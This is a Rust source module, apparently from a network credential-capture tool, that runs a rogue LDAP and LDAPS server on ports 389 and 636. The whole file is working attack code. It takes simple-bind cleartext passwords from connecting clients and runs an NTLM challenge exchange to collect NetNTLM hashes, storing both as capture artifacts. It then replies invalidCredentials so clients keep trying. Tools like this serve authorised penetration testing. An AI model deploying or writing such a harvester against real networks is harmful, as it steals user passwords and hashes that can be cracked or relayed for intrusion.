//! Rogue LDAP/LDAPS server (TCP 389/636) capturing simple-bind cleartext and SASL/NTLM tokens.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Result;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio_rustls::TlsAcceptor;

use crate::capture::model::{CaptureArtifact, Protocol};
use crate::constants::Service;
use crate::net::tls;
use crate::protocols::ber;
use crate::protocols::ntlm;

use super::ServerContext;

pub async fn serve(listener: TcpListener, ctx: Arc<ServerContext>, tls_mode: bool) -> Result<()> {
    if tls_mode {
        let config = tls::server_config(&ctx.cfg.ssl_cert, &ctx.cfg.ssl_key)?;
        let acceptor = TlsAcceptor::from(config);
        loop {
            let (stream, peer) = listener.accept().await?;
            let acceptor = acceptor.clone();
            let ctx = ctx.clone();
            tokio::spawn(async move {
                if let Ok(tls_stream) = acceptor.accept(stream).await {
                    let _ = handle(tls_stream, peer, ctx, Protocol::Ldaps).await;
                }
            });
        }
    } else {
        loop {
            let (stream, peer) = listener.accept().await?;
            let ctx = ctx.clone();
            tokio::spawn(async move {
                let _ = handle(stream, peer, ctx, Protocol::Ldap).await;
            });
        }
    }
}

async fn read_u8<S: AsyncRead + Unpin>(s: &mut S) -> Option<u8> {
    let mut b = [0u8; 1];
    s.read_exact(&mut b).await.ok()?;
    Some(b[0])
}

async fn read_ber<S: AsyncRead + Unpin>(s: &mut S) -> Option<Vec<u8>> {
    let tag = read_u8(s).await?;
    let first = read_u8(s).await?;
    let mut header = vec![tag, first];
    let len = if first & 0x80 == 0 {
        first as usize
    } else {
        let n = (first & 0x7f) as usize;
        let mut l = 0usize;
        for _ in 0..n {
            let b = read_u8(s).await?;
            header.push(b);
            l = (l << 8) | b as usize;
        }
        l
    };
    let mut content = vec![0u8; len];
    s.read_exact(&mut content).await.ok()?;
    header.extend_from_slice(&content);
    Some(header)
}

async fn handle<S: AsyncRead + AsyncWriteExt + AsyncWrite + Unpin>(
    mut s: S,
    peer: SocketAddr,
    ctx: Arc<ServerContext>,
    protocol: Protocol,
) -> Result<()> {
    while let Some(msg) = read_ber(&mut s).await {
        let Some(op) = ber::parse_bind(&msg) else {
            // Non-bind request: acknowledge with success.
            let resp = ber::build_bind_response(0, 0, None);
            let _ = s.write_all(&resp).await;
            continue;
        };
        let service = if protocol == Protocol::Ldaps {
            Service::Ldaps
        } else {
            Service::Ldap
        };
        if let Some(simple) = &op.simple {
            let pass = String::from_utf8_lossy(simple).to_string();
            if let Some(art) = CaptureArtifact::cleartext(protocol, peer.ip(), &op.dn, &pass) {
                ctx.sink.artifact(art);
            }
            let resp = ber::build_bind_response(op.message_id, 49, None); // invalidCredentials
            s.write_all(&resp).await?;
        } else if let Some(creds) = &op.sasl_creds {
            if let Some(token) = crate::protocols::smb::extract_ntlmssp(creds) {
                match ntlm::message_type(&token) {
                    Some(1) => {
                        let challenge = ctx.build_challenge(service);
                        let resp = ber::build_bind_response(op.message_id, 14, Some(&challenge)); // saslBindInProgress
                        s.write_all(&resp).await?;
                    }
                    Some(3) => {
                        let ch = ctx.challenge_for(service);
                        if let Some(net) = ntlm::parse_type3(&token, &ch) {
                            ctx.sink
                                .artifact(CaptureArtifact::netntlm(protocol, peer.ip(), &net));
                        }
                        let resp = ber::build_bind_response(op.message_id, 49, None);
                        s.write_all(&resp).await?;
                    }
                    _ => {
                        let resp = ber::build_bind_response(op.message_id, 49, None);
                        s.write_all(&resp).await?;
                    }
                }
            } else {
                let resp = ber::build_bind_response(op.message_id, 49, None);
                s.write_all(&resp).await?;
            }
        } else {
            let resp = ber::build_bind_response(op.message_id, 49, None);
            s.write_all(&resp).await?;
        }
    }
    Ok(())
}
